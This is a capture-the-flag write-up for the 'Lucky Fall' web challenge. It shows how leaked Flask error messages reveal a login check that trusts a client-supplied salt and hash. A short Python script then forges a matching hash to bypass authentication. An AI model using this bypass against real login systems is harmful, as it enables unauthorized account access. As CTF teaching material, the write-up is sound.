<h2>Lucky Fall</h2>

<blockquote>
  <p>Solved By : thewhiteh4t</p>
</blockquote>

<ul>
<li>we have a simple login page</li>
<li>JSON body is sent to the server which contains username and password</li>
<li>Unusual thing here is that the error is shown in a javascript alert</li>
</ul>

<p><img src="https://i.imgur.com/gDkpo4r.png" alt="" /></p>

<ul>
<li>the page source looked normal so I proceeded to intercept the login request with burpsuite</li>
<li>if we remove the <code>name</code> key value pair from JSON body we can see the following error :</li>
</ul>

<p><img src="https://i.imgur.com/bcDVpIS.png" alt="" /></p>

<ul>
<li><p>this error reveals few things to us :</p>

<ul>
<li>python flask backend is used</li>
<li>the exceptions are showed in the alert pop up</li>
<li><code>name</code> key value pair are required</li>
</ul></li>
<li><p>after this I tried to remove the <code>password</code> key : </p></li>
</ul>

<p><img src="https://i.imgur.com/SZeBtyH.png" alt="" /></p>

<ul>
<li>here we can see an <code>if</code> condition which looks like the logic behind the login function</li>
<li>It is calculating the SHA256 hash of concatenation of <code>password</code> and <code>salt</code></li>
<li>then it compares it with a <code>hash</code> value</li>
<li>but if we take a look carefully we can see that the values of <code>salt</code> and <code>hash</code> are being taken from the JSON request body</li>
<li>so we can set our own <code>salt</code> and <code>hash</code> just like <code>username</code> and <code>password</code></li>
<li>I wrote a small python script to get the flag</li>
<li>here <code>username</code>, <code>password</code> and <code>salt</code> can be any values, we just need to satisfy the if condition to get the flag</li>
</ul>

<p>```python</p>

<h1>!/usr/bin/env python3</h1>

<p>import requests
import hashlib</p>

<p>url = 'http://lucky-fall.challs.m0lecon.it/'
uname = 'admin'
passw = 'password'
salt = 'salt'
Hash = hashlib.sha256((passw + salt).encode('UTF-8')).hexdigest()</p>

<p>json_body = {
    'name': uname,
    'password': passw,
    'salt': salt,
    'hash': Hash
}</p>

<p>r = requests.post(url + 'login', json=json_body)
print(r.text)
```</p>

<p><strong>OUTPUT :</strong></p>

<p><img src="https://i.imgur.com/257p2bC.png" alt="" /></p>
